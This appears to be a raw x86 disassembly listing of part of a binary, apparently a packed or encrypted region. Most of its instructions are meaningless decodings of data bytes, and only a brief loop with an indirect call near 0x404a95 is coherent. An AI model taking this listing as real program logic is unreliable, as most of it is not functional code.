  404827:	and    BYTE PTR [esi-0x79e5b5c4],0xb6
  40482e:	das    
  40482f:	cmp    al,0x53
  404831:	ins    DWORD PTR es:[edi],dx
  404832:	fdivr  DWORD PTR [esi-0x75f721db]
  404838:	test   ebx,0xd6d923a8
  40483e:	jbe    0x4047fa
  404840:	inc    esi
  404841:	hlt    
  404842:	pop    edi
  404843:	test   al,0x12
  404845:	push   0x64
  404847:	push   eax
  404848:	fist   DWORD PTR [eax]
  40484a:	xchg   ebx,eax
  40484b:	data16 jo 0x4048be
  40484e:	add    ebx,DWORD PTR [ebp+edx*8+0x40127c7e]
  404855:	dec    edx
  404856:	imul   esp,DWORD PTR [eax],0xffffff88
  404859:	mov    ds:0x76d327f4,eax
  40485e:	pop    esp
  40485f:	jecxz  0x4048ca
  404861:	mov    eax,0x6eb3d2ef
  404866:	and    BYTE PTR [ecx-0x1cb822a7],dl
  40486c:	xchg   ebx,eax
  40486d:	adc    edx,DWORD PTR [edi+ebx*4+0x2]
  404871:	stc    
  404872:	cwde   
  404873:	jne    0x4048c2
  404875:	push   0x3b350a54
  40487a:	xchg   ecx,eax
  40487b:	pop    esp
  40487c:	jno    0x404848
  40487e:	push   esi
  40487f:	mov    ds:0xee4863f8,al
  404884:	xchg   edi,eax
  404885:	pop    es
  404886:	adc    ch,bl
  404888:	int    0x34
  40488a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40488b:	(bad)  
  40488c:	rcr    DWORD PTR [ebx],0xb5
  40488f:	xchg   ecx,eax
  404890:	push   ebx
  404891:	dec    ebp
  404892:	dec    ecx
  404893:	mov    ah,0x42
  404895:	jnp    0x404828
  404897:	hlt    
  404898:	loop   0x4048a9
  40489a:	enter  0x4120,0xd2
  40489e:	pop    ss
  40489f:	mov    eax,DWORD PTR [edx]
  4048a1:	push   ecx
  4048a2:	stos   BYTE PTR es:[edi],al
  4048a3:	xchg   BYTE PTR [ecx+0x3f31f4a3],ch
  4048a9:	adc    DWORD PTR [eax],ebx
  4048ab:	push   ebx
  4048ac:	neg    DWORD PTR [eax+0x66]
  4048af:	sbb    dl,BYTE PTR [ecx]
  4048b1:	and    eax,0xc0672db6
  4048b6:	mov    ds:0xf568e068,al
  4048bb:	xor    ah,cl
  4048bd:	push   es
  4048be:	mov    eax,0xf8f2392f
  4048c3:	pusha  
  4048c4:	jp     0x40493f
  4048c6:	and    dl,BYTE PTR [ecx-0x73]
  4048c9:	into   
  4048ca:	mov    dh,0x4c
  4048cc:	ret    0x9c6f
  4048cf:	retf   0x390a
  4048d2:	cmp    eax,DWORD PTR [ebx-0x412bf839]
  4048d8:	or     al,0x87
  4048da:	pusha  
  4048db:	cwde   
  4048dc:	sub    DWORD PTR [ebx+0x1],edi
  4048df:	jmp    0xa267:0xdee85291
  4048e6:	(bad)  
  4048e7:	cmp    al,0x48
  4048e9:	outs   dx,DWORD PTR ds:[esi]
  4048ea:	push   eax
  4048eb:	xchg   ch,dl
  4048ed:	add    al,0xc3
  4048ef:	ret    0xe90
  4048f2:	xchg   ecx,eax
  4048f3:	ins    BYTE PTR es:[edi],dx
  4048f4:	push   ds
  4048f5:	and    cl,BYTE PTR [eax-0x5f3979c9]
  4048fb:	and    BYTE PTR [esi+eax*1+0xd],bh
  4048ff:	stos   DWORD PTR es:[edi],eax
  404900:	inc    ebp
  404901:	jecxz  0x4048ec
  404903:	je     0x404951
  404905:	dec    edx
  404906:	inc    esp
  404907:	loope  0x4048e4
  404909:	stos   BYTE PTR es:[edi],al
  40490a:	jo     0x404947
  40490c:	out    dx,eax
  40490d:	mov    ds:0x5ee106e3,al
  404912:	sbb    ebx,DWORD PTR [ebx+0x54c24c8c]
  404918:	std    
  404919:	(bad)  
  40491a:	loopne 0x404980
  40491c:	fistp  DWORD PTR [ebx-0x4e]
  40491f:	push   0x26
  404921:	stos   DWORD PTR es:[edi],eax
  404922:	mov    al,0x1e
  404924:	dec    esp
  404925:	lods   eax,DWORD PTR ds:[esi]
  404926:	mov    dl,0x89
  404928:	retf   
  404929:	out    dx,al
  40492a:	adc    eax,0x3e3a7dc1
  40492f:	mov    esp,0x54efb329
  404934:	mov    esi,0xc71704ca
  404939:	pop    edx
  40493a:	push   es
  40493b:	jb     0x4048f0
  40493d:	or     al,0x82
  40493f:	scas   eax,DWORD PTR es:[edi]
  404940:	xor    DWORD PTR [esi],ebp
  404942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404943:	addr16 pop ss
  404945:	cs inc ebp
  404947:	test   DWORD PTR [ecx],ecx
  404949:	xor    al,0x5b
  40494b:	aaa    
  40494c:	fsubr  DWORD PTR [ecx+0x19]
  40494f:	sbb    al,0x5b
  404951:	jmp    0x66dba287
  404956:	jmp    0x3ab00091
  40495b:	mov    eax,0xd54d6740
  404960:	push   0x46
  404962:	xor    edi,esi
  404964:	ret    
  404965:	gs pop eax
  404967:	xchg   esp,eax
  404968:	test   cl,cl
  40496a:	imul   esi,DWORD PTR [ebx+0x11b00ed],0xfe034028
  404974:	push   edi
  404975:	icebp  
  404976:	(bad)  
  404977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404978:	mov    ecx,0xb8415585
  40497d:	pop    esi
  40497e:	xor    eax,0x27d34290
  404983:	xlat   BYTE PTR ds:[ebx]
  404984:	icebp  
  404985:	clc    
  404986:	pop    ebx
  404987:	jmp    0x347b91a3
  40498c:	add    ah,BYTE PTR [edi+0x7a27e5]
  404992:	jnp    0x404940
  404994:	push   es
  404995:	add    esi,DWORD PTR [ebp-0x2b]
  404998:	dec    edi
  404999:	leave  
  40499a:	mov    bh,0xf9
  40499c:	pop    es
  40499d:	div    DWORD PTR [eax]
  40499f:	ss pop esp
  4049a1:	lgs    ecx,FWORD PTR [edi+0x64f5411c]
  4049a8:	ins    BYTE PTR es:[edi],dx
  4049a9:	pop    ecx
  4049aa:	mov    edx,0xc500ffe1
  4049af:	dec    esp
  4049b0:	add    eax,0xf2e2b7be
  4049b5:	pop    ebp
  4049b6:	sar    DWORD PTR [ebx],1
  4049b8:	inc    ebx
  4049b9:	test   eax,0xace931d5
  4049be:	dec    edx
  4049bf:	push   ebx
  4049c0:	iret   
  4049c1:	push   esi
  4049c2:	jg     0x4049dc
  4049c4:	push   edx
  4049c5:	or     DWORD PTR [ebp+0x3c9cbf8b],ecx
  4049cb:	xor    eax,0x922f9572
  4049d0:	mov    edi,DWORD PTR [eax-0x8]
  4049d3:	push   ss
  4049d4:	push   edx
  4049d5:	jo     0x40496a
  4049d7:	shl    esi,1
  4049d9:	adc    edi,ecx
  4049db:	lea    ebp,[ecx-0x3e]
  4049de:	in     eax,dx
  4049df:	leave  
  4049e0:	jne    0x40498d
  4049e2:	jp     0x4049ec
  4049e4:	fs nop
  4049e6:	pop    ss
  4049e7:	jno    0x4049b3
  4049e9:	in     al,0xdc
  4049eb:	xchg   ecx,eax
  4049ec:	and    DWORD PTR [ecx-0x3ae5362c],eax
  4049f2:	retf   
  4049f3:	std    
  4049f4:	or     al,0x56
  4049f6:	fcmove st,st(3)
  4049f8:	pop    ss
  4049f9:	pop    ebp
  4049fa:	sub    eax,0x40e0c97b
  4049ff:	scas   al,BYTE PTR es:[edi]
  404a00:	test   eax,0x9dcf3713
  404a05:	sub    dl,BYTE PTR [esi+eax*8-0xb]
  404a09:	push   eax
  404a0a:	loop   0x404a84
  404a0c:	cmp    eax,0x77c06256
  404a11:	dec    eax
  404a12:	dec    ebx
  404a13:	shr    DWORD PTR [ebp+0x6],0x47
  404a17:	xor    dl,al
  404a19:	add    cl,cl
  404a1b:	adc    DWORD PTR [eax-0x66877e88],0xc722b5c8
  404a25:	mov    fs,WORD PTR [eax+ebp*1-0x67b8028]
  404a2c:	(bad)  
  404a2d:	nop/reserved BYTE PTR [esi-0x46]
  404a31:	enter  0x47cc,0x5
  404a35:	mov    ah,0xab
  404a37:	les    ecx,FWORD PTR [ecx+0xe31dd46]
  404a3d:	jbe    0x404a58
  404a3f:	mov    ch,0x27
  404a41:	pop    ecx
  404a42:	push   ebp
  404a43:	and    al,0x9f
  404a45:	xchg   ebp,eax
  404a46:	or     dh,BYTE PTR [edx]
  404a48:	fst    QWORD PTR [ecx+edi*1]
  404a4b:	in     eax,0xe
  404a4d:	add    ebx,ebx
  404a4f:	scas   eax,DWORD PTR es:[edi]
  404a50:	sub    ebx,DWORD PTR [ebx-0x3a]
  404a53:	and    DWORD PTR [edx+0x7a],0x8795a70b
  404a5a:	int    0x8f
  404a5c:	into   
  404a5d:	enter  0xf3e,0x9e
  404a61:	push   ds
  404a62:	(bad)  
  404a63:	sub    BYTE PTR [ecx-0xb],al
  404a66:	sbb    esi,esp
  404a68:	sub    eax,0x73ae852c
  404a6d:	cmp    eax,0x3bdbac59
  404a72:	inc    ecx
  404a73:	pop    edx
  404a74:	aas    
  404a75:	inc    esi
  404a76:	add    edx,ecx
  404a78:	mov    DWORD PTR ds:0xbbc88427,ebp
  404a7e:	pusha  
  404a7f:	mov    esi,0x8174f19b
  404a84:	xchg   BYTE PTR ds:0xca743433,dl
  404a8a:	das    
  404a8b:	inc    esi
  404a8c:	aad    0xa0
  404a8e:	xor    BYTE PTR [eax+0x3574117],dl
  404a94:	(bad)  
  404a95:	xor    ecx,DWORD PTR ds:0x42a311
  404a9b:	mov    DWORD PTR [ebp-0x30],eax
  404a9e:	or     DWORD PTR ds:0x42a325,edi
  404aa4:	mov    eax,DWORD PTR [ebp-0x28]
  404aa7:	and    DWORD PTR ds:0x42a39d,0x0
  404ab1:	jmp    0x404ac3
  404ab6:	mov    ecx,DWORD PTR ds:0x42a39d
  404abc:	inc    ecx
  404abd:	mov    DWORD PTR ds:0x42a39d,ecx
  404ac3:	cmp    DWORD PTR ds:0x42a39d,0x1a
  404aca:	jae    0x404aed
  404ad0:	cmp    DWORD PTR ds:0x42a39d,0x27
  404ad7:	jne    0x404ae8
  404add:	push   0x42a615
  404ae2:	call   DWORD PTR ds:0x425350
  404ae8:	jmp    0x404ab6
  404aed:	xor    eax,esi
  404aef:	adc    DWORD PTR ds:0x42a3d9,0x646a
  404af9:	add    eax,edi
  404afb:	jmp    0x405006
  404b00:	enter  0xd1ce,0xd2
  404b04:	rcl    ecx,1
  404b06:	iret   
  404b07:	shl    BYTE PTR [eax-0x2f346ce9],cl
  404b0d:	call   0x32773be9
  404b12:	js     0x404b8c
  404b14:	push   0x7c
  404b16:	js     0x404b90
  404b18:	pop    ebp
  404b19:	mov    dh,0x26
  404b1b:	xchg   DWORD PTR [ecx],ecx
  404b1d:	xchg   ah,dh
  404b1f:	lods   eax,DWORD PTR ds:[esi]
  404b20:	add    eax,0xad55f12b
  404b26:	repnz repnz fmul DWORD PTR [eax-0x77b91497]
  404b2e:	idiv   DWORD PTR [edx-0x1f]
  404b31:	mov    bl,al
  404b33:	aaa    
  404b34:	scas   eax,DWORD PTR es:[edi]
  404b35:	add    edi,edx
  404b37:	imul   ecx,DWORD PTR [ebx],0xffffffca
  404b3a:	fwait
  404b3b:	sti    
  404b3c:	cmp    ch,bh
  404b3e:	and    ebx,ebx
  404b40:	mov    ah,0x3d
  404b42:	imul   eax,esp,0x42
  404b45:	mov    es,WORD PTR [esi-0x6d]
  404b48:	fnstcw WORD PTR [ebx-0x7d]
  404b4b:	ss loop 0x404b13
  404b4e:	adc    dh,bl
  404b50:	add    eax,0xfa7546d1
  404b55:	dec    eax
  404b56:	jb     0x404ae8
  404b58:	bound  esi,QWORD PTR [ecx-0x485fd0ee]
  404b5e:	mov    esp,0x4c22d4ad
  404b63:	dec    esp
  404b64:	gs sub ecx,ebp
  404b67:	hlt    
  404b68:	and    ebp,DWORD PTR [esi-0x6ad40d42]
  404b6e:	dec    ebx
  404b6f:	and    cl,BYTE PTR [eax]
  404b71:	fld    QWORD PTR [ebp+0x25]
  404b74:	ret    0x4fdd
  404b77:	push   ecx
  404b78:	or     esi,0xffffffce
  404b7b:	mov    al,0xba
  404b7d:	pusha  
  404b7e:	(bad)  [eax-0xd]
  404b81:	hlt    
  404b82:	sbb    DWORD PTR [edi],ebp
  404b84:	adc    bh,bl
  404b86:	dec    esp
  404b87:	rcl    ebp,cl
  404b89:	mov    DWORD PTR [edx+edi*2+0x7f1ed6d8],esp
  404b90:	or     ebx,DWORD PTR [ecx+ebx*8-0x6e]
  404b94:	dec    esp
  404b95:	ins    BYTE PTR es:[edi],dx
  404b96:	xchg   ecx,eax
  404b97:	sbb    bh,BYTE PTR [ebx]
  404b99:	sbb    BYTE PTR [edi+esi*4+0x2c],al
  404b9d:	std    
  404b9e:	rcl    BYTE PTR ds:0xa9b33103,1
  404ba4:	aas    
  404ba5:	arpl   bx,dx
  404ba7:	rcl    BYTE PTR [esi+0x6101a7bc],1
  404bad:	aad    0xf0
  404baf:	mov    esp,0xbde7e02d
  404bb4:	jns    0x404bc0
  404bb6:	sub    BYTE PTR [esi+eax*2-0x58dfe9c3],dl
  404bbd:	adc    BYTE PTR [eax],cl
  404bbf:	adc    esp,DWORD PTR [esi+0x3]
  404bc2:	mov    esp,0x103eceb0
  404bc7:	sub    eax,0x3943ac1c
  404bcc:	sbb    eax,0x284d7e75
  404bd1:	cmp    bh,BYTE PTR [ecx+0x4b673ff0]
  404bd7:	das    
  404bd8:	pop    ebp
  404bd9:	sbb    al,cl
  404bdb:	nop
  404bdc:	or     BYTE PTR [edi+0x76cde337],ch
  404be2:	inc    eax
  404be3:	ret    0x19dd
  404be6:	push   ebx
  404be7:	int    0x1b
  404be9:	ins    BYTE PTR es:[edi],dx
  404bea:	pop    ebp
  404beb:	adc    DWORD PTR [ebp-0x2c2973b7],esp
  404bf1:	or     al,0xe6
  404bf3:	jg     0x404b82
  404bf5:	out    0xad,eax
  404bf7:	ins    DWORD PTR es:[edi],dx
  404bf8:	fild   QWORD PTR [esi+eax*8+0x1]
  404bfc:	mov    eax,ds:0xed62c8a4
  404c01:	mov    ds:0xc7c3b174,eax
  404c06:	cs add al,0xbd
  404c09:	jbe    0x404c10
  404c0b:	mov    esp,0x5e14410e
  404c10:	sbb    esp,DWORD PTR [ecx]
  404c12:	int3   
  404c13:	lahf   
  404c14:	jle    0x404ba4
  404c16:	push   ds
  404c17:	inc    esi
  404c18:	dec    ebp
  404c19:	pop    ss
  404c1a:	push   ebx
  404c1b:	daa    
  404c1c:	leave  
  404c1d:	mov    WORD PTR [ebp+ecx*2+0x18],gs
  404c21:	sbb    BYTE PTR [eax],cl
  404c23:	xor    al,0xd
  404c25:	push   ebp
  404c26:	sbb    ecx,edi
  404c28:	sub    eax,DWORD PTR [ebp-0x34b0dc72]
  404c2e:	outs   dx,BYTE PTR ds:[esi]
  404c2f:	push   esi
  404c30:	loopne 0x404c0a
  404c32:	lds    esp,FWORD PTR [ebx]
  404c34:	sbb    bl,cl
  404c36:	stc    
  404c37:	or     eax,0x852de264
  404c3c:	mov    ?,edx
  404c3e:	test   BYTE PTR [ecx-0x54],dh
  404c41:	xchg   BYTE PTR ds:0xfe6f0949,dl
  404c47:	call   0x8da4:0x71f677c5
  404c4e:	inc    esi
  404c4f:	int    0xee
  404c51:	(bad)  
  404c52:	mov    ds:0x434695da,eax
  404c57:	shl    dl,1
  404c59:	ins    DWORD PTR es:[edi],dx
  404c5a:	sbb    bh,BYTE PTR [esi-0x75]
  404c5d:	int    0xfd
  404c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c60:	mov    al,ds:0x66c0729c
  404c65:	dec    edx
  404c66:	dec    esi
  404c67:	in     eax,dx
  404c68:	xor    dh,BYTE PTR ds:0x3fff552f
  404c6e:	call   0x97a4:0xa9c795a8
  404c75:	mov    ecx,0xe61950e6
  404c7a:	sub    BYTE PTR [ecx-0x22b8d5f2],cl
  404c80:	es mov ebx,0xf31f000
  404c86:	ffree  st(2)
  404c88:	pop    ss
  404c89:	jno    0x404c40
  404c8b:	data16 mov al,ds:0xb9cbf748
  404c91:	pop    es
  404c92:	mov    eax,0x6699ef5b
  404c97:	mov    BYTE PTR [edx-0x214235a8],ah
  404c9d:	sub    ebp,DWORD PTR [ebx]
  404c9f:	out    dx,eax
  404ca0:	pop    esi
  404ca1:	hlt    
  404ca2:	sbb    ecx,DWORD PTR ds:0x9f9ce489
  404ca8:	xor    BYTE PTR gs:[eax-0x3d],cl
  404cac:	adc    BYTE PTR [ebp-0x56e123b5],0x73
  404cb3:	mov    ds:0x9a858641,al
  404cb8:	xor    BYTE PTR gs:[eax],al
  404cbb:	int    0xd5
  404cbd:	es mov esp,0x166ae815
  404cc3:	mov    eax,0x7bc0dda8
  404cc8:	mov    eax,0x67fed34b
  404ccd:	lea    edx,ss:[edx+0x45]
  404cd1:	pop    ebx
  404cd2:	dec    ebx
  404cd3:	in     al,dx
  404cd4:	(bad)  
  404cd5:	mov    ecx,0xc9f24416
  404cda:	add    DWORD PTR [esi+ecx*4-0x24e2b917],edi
  404ce1:	sar    DWORD PTR [ecx-0x14a09cdf],cl
  404ce7:	jmp    0x404cdf
  404ce9:	repnz rol DWORD PTR [edi+0x79],cl
  404ced:	sar    DWORD PTR [eax],cl
  404cef:	mov    edi,esp
  404cf1:	sbb    ch,al
  404cf3:	test   DWORD PTR [edi+0x2f3cef02],ebp
  404cf9:	pop    ds
  404cfa:	sub    BYTE PTR [ebx],al
  404cfc:	lock pop ebx
  404cfe:	cmp    bl,BYTE PTR [esp+ebp*1-0xe]
  404d02:	cmp    eax,0x3edae0f8
  404d07:	dec    ebp
  404d08:	test   eax,0x391c6882
  404d0d:	jge    0x404c90
  404d0f:	mov    edi,eax
  404d11:	cmp    edx,DWORD PTR [ebx-0x7]
  404d14:	cmc    
  404d15:	sub    al,0x47
  404d17:	aaa    
  404d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d19:	adc    edi,DWORD PTR [ebp+ebx*8-0x5f]
  404d1d:	sbb    DWORD PTR [ebp+0x68e6fc4f],ecx
  404d23:	in     eax,dx
  404d24:	scas   eax,DWORD PTR es:[edi]
  404d25:	test   al,0x1c
  404d27:	test   esp,ecx
  404d29:	pop    ebp
  404d2a:	jecxz  0x404d14
  404d2c:	and    BYTE PTR [esi],ah
  404d2e:	dec    esp
  404d2f:	arpl   WORD PTR [ebp+0x144a7367],ax
  404d35:	cli    
  404d36:	inc    edi
  404d37:	lods   eax,DWORD PTR ds:[esi]
  404d38:	retf   
  404d39:	scas   al,BYTE PTR es:[edi]
  404d3a:	xchg   esp,eax
  404d3b:	stos   DWORD PTR es:[edi],eax
  404d3c:	out    dx,eax
  404d3d:	fsub   QWORD PTR [edi-0x5a]
  404d40:	(bad)  
  404d41:	ins    DWORD PTR es:[edi],dx
  404d42:	cwde   
  404d43:	loop   0x404d1e
  404d45:	xor    DWORD PTR [eax-0x1ead6bc3],eax
  404d4b:	mov    dl,dl
  404d4d:	xchg   edx,eax
  404d4e:	inc    ebp
  404d4f:	hlt    
  404d50:	imul   ebx,DWORD PTR gs:[ebp-0x14],0x32d8856a
  404d58:	call   0xabaa:0xce030048
  404d5f:	pop    ebx
  404d60:	fdiv   DWORD PTR [eax+eiz*1+0x45d5eb0]
  404d67:	cdq    
  404d68:	popf   
  404d69:	aaa    
  404d6a:	mov    ebx,0xe25d4727
  404d6f:	mov    edi,0x8484e241
  404d74:	sar    BYTE PTR [esi-0x2f31d2c3],0x16
  404d7b:	or     eax,0x7ed2f7ee
  404d80:	shr    BYTE PTR [ebx-0x20],cl
  404d83:	or     edx,ebx
  404d85:	retf   0xfaa2
  404d88:	push   cs
  404d89:	(bad)  
  404d8a:	adc    eax,0x42dad004
  404d8f:	not    esp
  404d91:	(bad)  
  404d92:	out    dx,eax
  404d93:	arpl   WORD PTR [edx+0x16],bp
  404d96:	aaa    
  404d97:	jg     0x404d7e
  404d99:	call   0xa5f7:0xb99ff9f
  404da0:	sbb    eax,0xd39cad4
  404da5:	(bad)  [ebx]
  404da7:	fwait
  404da8:	adc    DWORD PTR [ebx],0x1c64761f
  404dae:	retf   
  404daf:	lahf   
  404db0:	fs add eax,0xa9816030
  404db6:	scas   al,BYTE PTR es:[edi]
  404db7:	into   
  404db8:	jmp    0xddba:0x11505f4e
  404dbf:	idiv   BYTE PTR [ebx+ebp*1-0x26]
  404dc3:	and    eax,0xc9a9a755
  404dc8:	lahf   
  404dc9:	add    eax,0xf33e20ff
  404dce:	push   esi
  404dcf:	cwde   
  404dd0:	mov    eax,ds:0xbe00c805
  404dd5:	cli    
  404dd6:	fstp   DWORD PTR es:[esp+ebp*1-0x513bc810]
  404dde:	in     eax,0x7e
  404de0:	ret    
  404de1:	xchg   ebp,eax
  404de2:	and    eax,0x15e472df
  404de7:	jl     0x404d8a
  404de9:	dec    edi
  404dea:	loop   0x404d7f
  404dec:	xchg   ebx,eax
  404ded:	cmp    dh,BYTE PTR [edx-0x1ba6db9a]
  404df3:	leave  
  404df4:	xchg   esp,eax
  404df6:	fdiv   QWORD PTR [ecx+0x5731d32]
  404dfc:	scas   al,BYTE PTR es:[edi]
  404dfd:	add    DWORD PTR [edi],0x5
  404e00:	or     cl,BYTE PTR [edx+0x62]
  404e03:	xlat   BYTE PTR ds:[ebx]
  404e04:	xor    BYTE PTR [ecx],al
  404e06:	(bad)  
  404e07:	mov    ebx,0xfa17374
  404e0c:	adc    al,BYTE PTR [edi-0x3]
  404e0f:	fidivr WORD PTR [edx]
  404e11:	in     eax,dx
  404e12:	ret    0xf103
  404e15:	xchg   ebp,eax
  404e16:	adc    ebp,DWORD PTR [ecx+0x1430d221]
  404e1c:	cmp    BYTE PTR [esi-0x362b27d1],ah
  404e22:	lods   eax,DWORD PTR ds:[esi]
  404e23:	das    
  404e24:	aad    0xfd
  404e26:	fimul  DWORD PTR [ecx-0x4777028c]
  404e2c:	pushf  
  404e2d:	jg     0x404e41
  404e2f:	popf   
  404e30:	sbb    DWORD PTR [eax+0xa],edx
  404e33:	inc    edx
  404e34:	mov    ch,0x6d
  404e36:	pop    es
  404e37:	pop    eax
  404e38:	mov    bh,ah
  404e3a:	ret    0xb178
  404e3d:	sbb    eax,0x32b22343
  404e42:	and    BYTE PTR [edx-0x3f],bl
  404e45:	jns    0x404df9
  404e47:	addr16 loop 0x404ec7
  404e4a:	push   edi
  404e4b:	xor    eax,0x4377d0bc
  404e50:	and    eax,0x6e211b87
  404e55:	iret   
  404e56:	or     BYTE PTR [edx-0x3464e5f9],ah
  404e5c:	pop    es
  404e5d:	lea    edi,gs:[esi]
  404e60:	xchg   esp,eax
  404e61:	enter  0x69f7,0xad
  404e65:	jne    0x404e09
  404e67:	push   ds
  404e68:	sub    BYTE PTR [eax],ch
  404e6a:	arpl   WORD PTR [edi-0x3c],di
  404e6d:	push   es
  404e6e:	mov    ah,0xc6
  404e70:	scas   al,BYTE PTR es:[edi]
  404e71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e72:	lea    edi,[ecx]
  404e74:	fldcw  WORD PTR [ebx]
  404e76:	sub    BYTE PTR [esi-0x245f0781],ah
  404e7c:	dec    ebx
  404e7d:	lods   al,BYTE PTR ds:[esi]
  404e7e:	inc    ebx
  404e7f:	daa    
  404e80:	imul   BYTE PTR [ecx-0x3620755b]
  404e86:	xchg   edi,eax
  404e87:	shl    BYTE PTR [ecx],cl
  404e89:	addr16 jl 0x404ea5
  404e8c:	inc    ebp
  404e8d:	retf   0xfbf9
  404e90:	add    DWORD PTR ds:0x49d77fa3,0xd85a42f5
  404e9a:	sbb    ebp,DWORD PTR ds:0xc7ff5ca
  404ea0:	aam    0x35
  404ea2:	dec    ebp
  404ea3:	mov    ds:0xc876c0a5,eax
  404ea8:	jecxz  0x404f0b
  404eaa:	jbe    0x404ebe
  404eac:	xchg   DWORD PTR [esi],esp
  404eae:	rcr    DWORD PTR [ebp-0x1e],cl
  404eb1:	xchg   edi,eax
  404eb2:	push   edi
  404eb3:	in     al,0x29
  404eb5:	dec    edx
  404eb6:	cmp    eax,DWORD PTR [edi]
  404eb8:	push   esi
  404eb9:	pop    es
  404eba:	jmp    0x404ee0
  404ebc:	daa    
  404ebd:	push   esi
  404ebe:	test   BYTE PTR [edx-0x5100322a],bl
  404ec4:	jle    0x404f01
  404ec6:	mov    edi,0xe8cc1235
  404ecb:	add    bh,BYTE PTR [edx]
  404ecd:	mov    cs:0x1c119c9,eax
  404ed3:	loop   0x404eb7
  404ed5:	ins    DWORD PTR es:[edi],dx
  404ed6:	xchg   esi,eax
  404ed7:	bound  esi,QWORD PTR [esi+0x46356244]
  404edd:	xchg   esp,eax
  404ede:	in     al,dx
  404edf:	inc    ecx
  404ee0:	mov    edx,0xef93fb3f
  404ee5:	retf   0xd2ce
  404ee8:	or     bh,BYTE PTR [ebp-0x4f]
  404eeb:	daa    
  404eec:	mov    al,ds:0x2e20ced8
  404ef1:	cs push ebp
  404ef3:	dec    eax
  404ef4:	(bad)  
  404ef5:	outs   dx,BYTE PTR ds:[esi]
  404ef6:	inc    ebp
  404ef7:	push   ss
  404ef8:	(bad)  
  404ef9:	xchg   ecx,eax
  404efa:	fsubp  st(5),st
  404efc:	jecxz  0x404f44
  404efe:	xchg   DWORD PTR [ebp-0x47930a7],esi
  404f04:	xchg   esp,eax
  404f05:	sub    DWORD PTR [edx],eax
  404f07:	mov    eax,0xa2baed5d
  404f0c:	mov    dh,0x83
  404f0e:	das    
  404f0f:	das    
  404f10:	repz mov al,ds:0xbce7f38e
  404f16:	(bad)  
  404f17:	sbb    al,0x50
  404f19:	in     al,dx
  404f1a:	daa    
  404f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f1c:	xchg   DWORD PTR [ebp-0x5688b677],edi
  404f22:	stc    
  404f23:	and    ecx,DWORD PTR [edx]
  404f25:	sub    al,0x5a
  404f27:	sub    DWORD PTR [edi],edi
  404f29:	and    BYTE PTR [ecx+0x79057e1],ah
  404f2f:	aad    0xea
  404f31:	mov    esi,0xedffd2e6
  404f36:	pop    es
  404f37:	inc    ecx
  404f38:	cmp    ebp,edi
  404f3a:	dec    esi
  404f3b:	iret   
  404f3c:	das    
  404f3d:	mov    dh,0x6
  404f3f:	pop    edi
  404f40:	int    0x3
  404f42:	add    eax,0xaacba6a8
  404f47:	lock ret 0x73c2
  404f4b:	pop    edi
  404f4c:	add    ebx,ebp
  404f4e:	sbb    DWORD PTR [esi+0x40],edi
  404f51:	retf   
  404f52:	dec    esi
  404f53:	pop    ecx
  404f54:	stc    
  404f55:	jecxz  0x404ee8
  404f57:	mov    al,ds:0xafa0b9a4
  404f5c:	loope  0x404f0d
  404f5e:	mov    ch,0xfb
  404f60:	add    bh,ah
  404f62:	lea    esi,[ebp+0x11]
  404f65:	sub    al,0x39
  404f67:	imul   esi,DWORD PTR [ebp+0x11],0xff0ad60
  404f6e:	repnz mov es:0x3966ab34,al
  404f75:	cmp    eax,DWORD PTR [eax]
  404f77:	out    0xa9,al
  404f79:	xor    ch,BYTE PTR [ebx+0x74]
  404f7c:	aaa    
  404f7d:	shl    dh,0x35
  404f80:	fnstcw WORD PTR [edx+0x36b210a0]
  404f86:	lods   al,BYTE PTR ds:[esi]
  404f87:	loop   0x404f81
  404f89:	add    BYTE PTR [esi+0xd],al
  404f8c:	outs   dx,BYTE PTR ds:[esi]
  404f8d:	call   0x76f34943
  404f92:	add    DWORD PTR [edi],0xffffff83
  404f95:	sub    bh,al
  404f97:	das    
  404f98:	out    dx,al
  404f99:	add    BYTE PTR [ecx+0xb],ah
  404f9c:	sbb    al,0xd4
  404f9e:	stos   DWORD PTR es:[edi],eax
  404f9f:	dec    ebp
  404fa0:	push   0xe212be53
  404fa5:	mov    dl,0xe3
  404fa7:	mov    ds:0x9cb4b3a7,al
  404fac:	pop    edx
  404fad:	dec    esi
  404fae:	push   esp
  404faf:	fnsave [ecx+0x6c175cff]
  404fb5:	test   DWORD PTR [ecx+0x1c],ebx
  404fb8:	clc    
  404fb9:	cmp    eax,esp
  404fbb:	retf   
  404fbc:	jb     0x404fde
  404fbe:	xchg   ecx,eax
  404fbf:	out    dx,al
  404fc0:	stos   BYTE PTR es:[edi],al
  404fc1:	mov    bh,0x9b
  404fc3:	sub    ebx,DWORD PTR [ecx]
  404fc5:	test   eax,0x63e3f68b
  404fca:	dec    ecx
  404fcb:	enter  0x6a9e,0x5a
  404fcf:	(bad)  
  404fd0:	sbb    eax,0xaf376d8
  404fd5:	add    al,0x20
  404fd7:	mov    esp,0x6fa706d0
  404fdc:	push   edi
  404fdd:	inc    ecx
  404fde:	xor    DWORD PTR [ebx+ebx*4-0x5],esi
  404fe2:	in     eax,dx
  404fe3:	sub    al,0x45
  404fe5:	push   esp
  404fe6:	test   DWORD PTR [ebp+0xcd53657],esi
  404fec:	in     al,0x5e
  404fee:	and    DWORD PTR gs:[ecx-0x1],eax
  404ff2:	int    0x41
  404ff4:	pusha  
  404ff5:	xchg   edi,eax
  404ff6:	mov    cl,0x43
  404ff8:	jno    0x40500f
  404ffa:	int3   
  404ffb:	sub    edi,DWORD PTR [esi+edx*2]
  404ffe:	adc    al,0xd
  405000:	mov    esi,0x73f6711b
  405005:	loop   0x404f90
  405007:	inc    ebp
  405008:	aam    0x2b
  40500a:	sbb    eax,0x42a3dd
  40500f:	jmp    0x40551a
  405014:	ret    0x3cd0
  405017:	int3   
  405018:	fcmovbe st,st(4)
  40501a:	rcl    dh,cl
  40501c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40501d:	or     eax,0x26fa7aa3
  405022:	imul   edx,DWORD PTR [ebx+0x20],0x6a787835
  405029:	jl     0x4050a3
  40502b:	js     0x405013
  40502d:	pop    ebx
  40502e:	mov    ah,0xfb
  405030:	scas   al,BYTE PTR es:[edi]
  405031:	jl     0x404fb5
